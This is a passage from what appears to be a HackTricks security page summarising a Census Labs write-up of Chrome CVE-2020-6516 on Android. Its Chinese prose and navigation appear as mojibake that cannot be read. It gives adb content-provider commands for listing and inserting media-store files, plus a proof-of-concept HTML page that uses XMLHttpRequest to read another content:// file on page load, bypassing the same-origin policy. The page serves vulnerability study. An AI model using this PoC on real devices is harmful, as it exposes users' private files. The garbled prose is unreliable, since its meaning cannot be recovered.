<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

å…¶ä»–æ”¯æŒHackTricksçš„æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* æ¢ç´¢[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬ç‹¬å®¶çš„[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ–åœ¨**Twitter**ä¸Šå…³æ³¨æˆ‘ä»¬ ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

**è¿™æ˜¯ä¸€ç¯‡æ–‡ç« çš„æ‘˜è¦ [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### åœ¨åª’ä½“å­˜å‚¨ä¸­åˆ—å‡ºæ–‡ä»¶
è¦åˆ—å‡ºåª’ä½“å­˜å‚¨ç®¡ç†çš„æ–‡ä»¶ï¼Œå¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤ï¼š
```bash
$ content query --uri content://media/external/file
```
ä¸ºäº†è·å¾—æ›´åŠ äººæ€§åŒ–çš„è¾“å‡ºï¼Œä»…æ˜¾ç¤ºæ¯ä¸ªç´¢å¼•æ–‡ä»¶çš„æ ‡è¯†ç¬¦å’Œè·¯å¾„ï¼š
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
### å†…å®¹æä¾›ç¨‹åº

å†…å®¹æä¾›ç¨‹åºè¢«éš”ç¦»åœ¨å®ƒä»¬è‡ªå·±çš„ç§æœ‰å‘½åç©ºé—´ä¸­ã€‚è®¿é—®æä¾›ç¨‹åºéœ€è¦ç‰¹å®šçš„ `content://` URIã€‚å…³äºè®¿é—®æä¾›ç¨‹åºçš„è·¯å¾„ä¿¡æ¯å¯ä»¥ä»åº”ç”¨æ¸…å•æˆ–Androidæ¡†æ¶çš„æºä»£ç ä¸­è·å–ã€‚

### Chrome è®¿é—®å†…å®¹æä¾›ç¨‹åº

åœ¨ Android ä¸Šï¼ŒChrome å¯ä»¥é€šè¿‡ `content://` æ–¹æ¡ˆè®¿é—®å†…å®¹æä¾›ç¨‹åºï¼Œä»è€Œå¯ä»¥è®¿é—®ç¬¬ä¸‰æ–¹åº”ç”¨ç¨‹åºå¯¼å‡ºçš„ç…§ç‰‡æˆ–æ–‡æ¡£ç­‰èµ„æºã€‚ä¸ºäº†è¯´æ˜è¿™ä¸€ç‚¹ï¼Œå¯ä»¥å°†æ–‡ä»¶æ’å…¥åˆ°åª’ä½“å­˜å‚¨ä¸­ï¼Œç„¶åé€šè¿‡ Chrome è®¿é—®ï¼š

å‘åª’ä½“å­˜å‚¨æ’å…¥è‡ªå®šä¹‰æ¡ç›®ï¼š
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
å‘ç°æ–°æ’å…¥æ–‡ä»¶çš„æ ‡è¯†ç¬¦ï¼š
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
æ–‡ä»¶å¯ä»¥ä½¿ç”¨ä½¿ç”¨æ–‡ä»¶æ ‡è¯†ç¬¦æ„å»ºçš„URLåœ¨Chromeä¸­æŸ¥çœ‹ã€‚

ä¾‹å¦‚ï¼Œè¦åˆ—å‡ºä¸ç‰¹å®šåº”ç”¨ç¨‹åºç›¸å…³çš„æ–‡ä»¶ï¼š
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: åŒæºç­–ç•¥ç»•è¿‡

_Same Origin Policy_ (SOP) æ˜¯æµè§ˆå™¨ä¸­çš„ä¸€ç§å®‰å…¨åè®®ï¼Œå®ƒé™åˆ¶äº†ç½‘é¡µä¸ä¸åŒæ¥æºçš„èµ„æºè¿›è¡Œäº¤äº’ï¼Œé™¤éç»è¿‡è·¨æºèµ„æºå…±äº« (CORS) ç­–ç•¥æ˜ç¡®å…è®¸ã€‚è¯¥ç­–ç•¥æ—¨åœ¨é˜²æ­¢ä¿¡æ¯æ³„éœ²å’Œè·¨ç«™è¯·æ±‚ä¼ªé€ ã€‚Chrome å°† `content://` è§†ä¸ºæœ¬åœ°æ–¹æ¡ˆï¼Œæ„å‘³ç€æ›´ä¸¥æ ¼çš„ SOP è§„åˆ™ï¼Œå…¶ä¸­æ¯ä¸ªæœ¬åœ°æ–¹æ¡ˆ URL éƒ½è¢«è§†ä¸ºä¸€ä¸ªå•ç‹¬çš„æ¥æºã€‚

ç„¶è€Œï¼ŒCVE-2020-6516 æ˜¯ Chrome ä¸­çš„ä¸€ä¸ªæ¼æ´ï¼Œå…è®¸é€šè¿‡ `content://` URL åŠ è½½çš„èµ„æºç»•è¿‡ SOP è§„åˆ™ã€‚å®é™…ä¸Šï¼Œæ¥è‡ª `content://` URL çš„ JavaScript ä»£ç å¯ä»¥è®¿é—®é€šè¿‡ `content://` URL åŠ è½½çš„å…¶ä»–èµ„æºï¼Œè¿™æ˜¯ä¸€ä¸ªé‡è¦çš„å®‰å…¨é—®é¢˜ï¼Œç‰¹åˆ«æ˜¯åœ¨è¿è¡Œæ—©äº Android 10 ç‰ˆæœ¬çš„ Android è®¾å¤‡ä¸Šï¼Œå› ä¸ºè¿™äº›è®¾å¤‡å°šæœªå®ç°ä½œç”¨åŸŸå­˜å‚¨ã€‚

ä¸‹é¢çš„æ¦‚å¿µéªŒè¯æ¼”ç¤ºäº†è¿™ä¸ªæ¼æ´ï¼Œå…¶ä¸­ä¸€ä¸ª HTML æ–‡æ¡£åœ¨ **/sdcard** ä¸‹ä¸Šä¼ å¹¶æ·»åŠ åˆ°åª’ä½“å­˜å‚¨åï¼Œä½¿ç”¨å…¶ JavaScript ä¸­çš„ `XMLHttpRequest` è®¿é—®å¹¶æ˜¾ç¤ºåª’ä½“å­˜å‚¨ä¸­å¦ä¸€ä¸ªæ–‡ä»¶çš„å†…å®¹ï¼Œç»•è¿‡äº† SOP è§„åˆ™ã€‚

æ¦‚å¿µéªŒè¯ HTML:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>ä»é›¶å¼€å§‹å­¦ä¹ AWSé»‘å®¢æŠ€æœ¯ï¼Œæˆä¸ºä¸“å®¶</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTEï¼ˆHackTricks AWS Red Team Expertï¼‰</strong></a><strong>ï¼</strong></summary>

æ”¯æŒHackTricksçš„å…¶ä»–æ–¹å¼ï¼š

* å¦‚æœæ‚¨æƒ³çœ‹åˆ°æ‚¨çš„**å…¬å¸åœ¨HackTricksä¸­åšå¹¿å‘Š**æˆ–**ä¸‹è½½PDFæ ¼å¼çš„HackTricks**ï¼Œè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)!
* è·å–[**å®˜æ–¹PEASS & HackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* å‘ç°[**PEASSå®¶æ—**](https://opensea.io/collection/the-peass-family)ï¼Œæˆ‘ä»¬çš„ç‹¬å®¶[**NFTs**](https://opensea.io/collection/the-peass-family)
* **åŠ å…¥** ğŸ’¬ [**Discordç¾¤**](https://discord.gg/hRep4RUj7f) æˆ– [**ç”µæŠ¥ç¾¤**](https://t.me/peass) æˆ– **å…³æ³¨**æˆ‘ä»¬çš„**Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**ã€‚**
* é€šè¿‡å‘[**HackTricks**](https://github.com/carlospolop/hacktricks)å’Œ[**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) githubä»“åº“æäº¤PRæ¥åˆ†äº«æ‚¨çš„é»‘å®¢æŠ€å·§ã€‚

</details>
